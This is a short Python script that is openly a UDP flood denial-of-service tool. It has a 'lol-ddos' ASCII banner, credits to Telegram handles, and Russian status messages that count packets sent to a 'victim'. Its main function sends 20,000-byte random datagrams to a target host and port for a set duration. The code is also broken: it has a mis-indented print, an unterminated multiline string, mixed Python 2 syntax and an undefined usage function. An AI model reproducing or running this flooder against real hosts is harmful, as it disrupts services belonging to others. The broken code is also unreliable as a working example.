#coded by @qwadoh & @svchost_link

import time
import socket
import random
import sys
 print('
 _         _              _      _             
| |       | |            | |    | |            
| |  ___  | | ______   __| |  __| |  ___   ___ 
| | / _ \ | ||______| / _` | / _` | / _ \ / __|
| || (_) || |        | (_| || (_| || (_) |\__ \
|_| \___/ |_|         \__,_| \__,_| \___/ |___/
                                          by @qwadoh
                                          search my channel in tg: @svchost_link     
                                               v 1.0(beta)
')
def flood(victim, vport, duration):
    # Создание сервера
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Отправка запросов
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass    
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mНапрвалено пакетов \033[1;32m%s \033[1;91mЖертва \033[1;32m%s \033[1;91Port: \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
